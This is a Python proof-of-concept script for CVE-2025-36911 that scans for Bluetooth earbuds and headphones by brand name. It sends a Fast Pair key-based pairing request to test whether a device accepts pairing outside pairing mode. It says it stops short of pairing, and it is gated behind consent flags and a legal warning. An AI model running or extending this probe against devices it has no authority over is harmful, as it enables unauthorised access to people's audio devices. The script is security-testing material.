#!/usr/bin/env python3
import asyncio
import argparse
import sys
import os

try:
    from bleak import BleakClient, BleakScanner
except ImportError:
    print("ERROR: bleak not installed. Run: pip install bleak")
    sys.exit(1)

FAST_PAIR_SERVICE = "0000fe2c-0000-1000-8000-00805f9b34fb"
KEY_BASED_PAIRING_CHAR = "fe2c1234-8366-4814-8eb0-01de32100bea"

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ╔╦╗╦╦ ╦ ▄ ╦ ╦╦ ╦╦╔═╗╔═╗╔═╗╦═╗╔═╗╔═╗╦═╗╔═╗╦╦═╗              ║
║    ║║║╚╦╝ ▄ ║║║╠═╣║╚═╗╠═╝╠═╝╠╦╝╠═╝╠═╣╠╦╝╠═╣║╠╦╝              ║
║   ═╩╝╩ ╩    ╚╩╝╩ ╩╩╚═╝╩  ╚═╝╩╚═╩  ╩ ╩╩╚═╩ ╩╩╩╚═              ║
║                                                              ║
║   CVE-2025-36911 - Fast Pair Verification Demo               ║
║   For authorized security testing only                       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""


async def scan_for_fast_pair_devices() -> list[tuple[str, str]]:
    print("[*] Scanning for Fast Pair devices...")
    devices = await BleakScanner.discover(timeout=10.0)
    
    fast_pair_devices = []
    keywords = ['WF-', 'WH-', 'LinkBuds', 'Pixel', 'Galaxy', 'Buds', 'Sony', 'JBL', 'Beats']
    
    for d in devices:
        if d.name and any(x.lower() in d.name.lower() for x in keywords):
            fast_pair_devices.append((d.address, d.name))
            print(f"    [+] {d.address} - {d.name}")
    
    if not fast_pair_devices:
        print("    (No known Fast Pair devices, checking for any BLE audio devices...)")
        for d in devices:
            if d.name and d.name != d.address:
                print(f"    [?] {d.address} - {d.name}")
    
    return fast_pair_devices


async def send_fast_pair_verification(ble_address: str) -> bool:
    print(f"[*] Sending Fast Pair verification request to {ble_address}...")
    
    try:
        async with BleakClient(ble_address, timeout=15.0) as client:
            if not client.is_connected:
                print("    [-] Connection failed")
                return False
            
            print(f"    [+] BLE connected")
            
            provider_addr = bytes.fromhex(ble_address.replace(":", ""))
            salt = os.urandom(8)
            flags = 0x11
            raw_request = bytes([0x00, flags]) + provider_addr + salt
            
            await client.write_gatt_char(KEY_BASED_PAIRING_CHAR, raw_request, response=True)
            print("    [+] REQUEST ACCEPTED - Device is LIKELY VULNERABLE")
            await asyncio.sleep(0.5)
            return True
            
    except Exception as e:
        print(f"    [-] Error: {e}")
        return False


async def run_verification(target_ble: str | None = None, loud: bool = False):
    print(BANNER)
    
    if target_ble:
        ble_address = target_ble
        device_name = "Unknown"
    else:
        devices = await scan_for_fast_pair_devices()
        if not devices:
            print("\n[-] No Fast Pair devices found!")
            return False
        
        ble_address, device_name = devices[0]
        print(f"\n[*] Targeting: {device_name} ({ble_address})")
    
    print("\n" + "=" * 60)
    print("STAGE 1: Fast Pair Verification (CVE-2025-36911)")
    print("=" * 60)
    
    vulnerable = False
    for i in range(3):
        # We only check if the device ACCEPTS the request while not in pairing mode.
        # We do NOT proceed to complete the pairing or play audio.
        success = await send_fast_pair_verification(ble_address)
        if success:
            vulnerable = True
            break
        await asyncio.sleep(1)
    
    if vulnerable:
        print("\n" + "=" * 60)
        print("✓ VULNERABILITY CONFIRMED")
        print("  The device accepted the Key-based Pairing Request.")
        print("  In a real attack, this would allow an attacker to pair.")
        print("=" * 60)
        print("\n[!] PROOF OF CONCEPT COMPLETE.")
        print("    No audio will be played. No pairing will be completed.")
        return True
    else:
        print("\n[-] Device did not respond. It may be patched or not vulnerable.")
        return False


def _confirm_authorized_use(skip_confirm: bool) -> bool:
    print(BANNER)
    print("\nAUTHORIZED USE CONFIRMATION")
    print("This tool performs ACTIVE Bluetooth operations.")
    print("Use only on devices you own or have explicit written authorization to test.")
    print("Unauthorized use may violate the UK Computer Misuse Act 1990 and other laws.\n")

    if skip_confirm:
        return True

    response = input("Type 'I AM AUTHORIZED' to continue: ").strip()
    return response == "I AM AUTHORIZED"


def main():
    parser = argparse.ArgumentParser(description="DIY-WhisperPair Verification Demo - CVE-2025-36911")
    parser.add_argument("--target", "-t", help="Target BLE address (auto-scan if not specified)")
    parser.add_argument("--loud", "-l", action="store_true", help="Ignored in sanitized version (kept for compatibility)")
    parser.add_argument("--authorized", action="store_true", help="Confirm you own the device and accept responsibility")
    parser.add_argument("--no-confirm", action="store_true", help="Skip interactive confirmation")
    args = parser.parse_args()

    if not args.authorized:
        print("\n[-] Refusing to run without explicit consent flag.")
        print("    Use --authorized to confirm you own the device and accept responsibility")
        sys.exit(2)

    if not _confirm_authorized_use(args.no_confirm):
        print("\n[-] Authorization confirmation failed.")
        sys.exit(2)

    try:
        success = asyncio.run(run_verification(target_ble=args.target, loud=args.loud))
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(130)


if __name__ == "__main__":
    main()
